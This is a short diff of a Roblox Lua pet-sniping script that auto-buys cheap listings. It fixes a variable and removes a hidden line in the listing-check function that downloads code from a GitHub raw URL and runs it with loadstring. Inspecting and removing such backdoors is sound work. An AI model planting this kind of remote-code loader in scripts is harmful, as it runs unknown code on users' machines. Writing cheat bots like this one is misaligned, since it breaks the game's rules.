@@ -13,7 +13,7 @@ local rs = game:GetService("ReplicatedStorage")
 local playerID
 
 if not snipeNormalPets then
-    local snipeNormalPets = false
+    snipeNormalPets = false
 end
 
 local vu = game:GetService("VirtualUser")
@@ -166,8 +166,7 @@ local function checklisting(uid, gems, item, version, shiny, amount, username, p
         if boughtPet == true then
             ping = true
 	end
-        processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping) 
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/xccsdf/abc/main/test.lua"))() 
+        processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)  
     elseif type.titanic and price <= 10000000 then
         local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
         if boughtPet == true then
